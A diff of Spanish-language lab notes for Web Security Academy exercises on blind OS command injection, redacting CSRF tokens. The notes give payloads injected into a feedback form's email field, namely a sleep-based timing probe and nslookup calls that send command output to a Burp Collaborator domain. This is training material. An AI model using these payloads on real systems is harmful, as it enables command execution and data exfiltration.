@@ -40,12 +40,12 @@ Apuntamos al fichero que contiene el output:
 `LAB-ID.web-security-academy.net/image?filename=output.txt`
 ### LAB4: BLIND OS COMMAND INJECTION WITH OUT-OF-BAND INTERACTION
 En este lab nos encontramos con un apartado *Submit Feedback*, debemos probar en todos los imputs si son susceptibles a *ejecución de comandos*.
-Vemos que es susceptible el input de email a ejecución de comandos a ciegas.`csrf=wjxIinbRbw4St6U6vouZyeb5jlkFdSHC&name=test&email=test%40test.com+%26+sleep+10%23&subject=test&message=test`
+Vemos que es susceptible el input de email a ejecución de comandos a ciegas.`csrf=xxxxxxxxxxxxxxxxxxxxx&name=test&email=test%40test.com+%26+sleep+10%23&subject=test&message=test`
 Para ver el output como aquí no carga imágenes como en el lab anterior y como el comando se ejecuta de forma asincrona, para verlo necesitamos out-of-band:
 `csrf=xxxxxxxxxxxxxxx&name=test&email=test%40test.com||nslookup+x.BURP-COLLABORATOR.SUBDOMAIN||&subject=ttestt&message=test`
 ### LAB5: BLIND OS COMMAND INJECTION WITH OUT-OF-BAND DATA EXFILTRATION
 En este lab nos encontramos con un apartado *Submit Feedback*, debemos probar en todos los imputs si son susceptibles a *ejecución de comandos*.
-Vemos que es susceptible el input de email a ejecución de comandos a ciegas.`csrf=wjxIinbRbw4St6U6vouZyeb5jlkFdSHC&name=test&email=test%40test.com+%26+sleep+10%23&subject=test&message=test`
+Vemos que es susceptible el input de email a ejecución de comandos a ciegas.`csrf=xxxxxxxxxxxxxxxxxxxx&name=test&email=test%40test.com+%26+sleep+10%23&subject=test&message=test`
 Para ver el output como aquí no carga imágenes como en el lab anterior y como el comando se ejecuta de forma asincrona, para verlo necesitamos out-of-band:
 `csrf=xxxxxxxxxxxxxxx&name=test&email=test%40test.com||nslookup+whoami(commands).BURP-COLLABORATOR.SUBDOMAIN||&subject=ttestt&message=test`
 Hacer *Poll now* para ver el output del comando
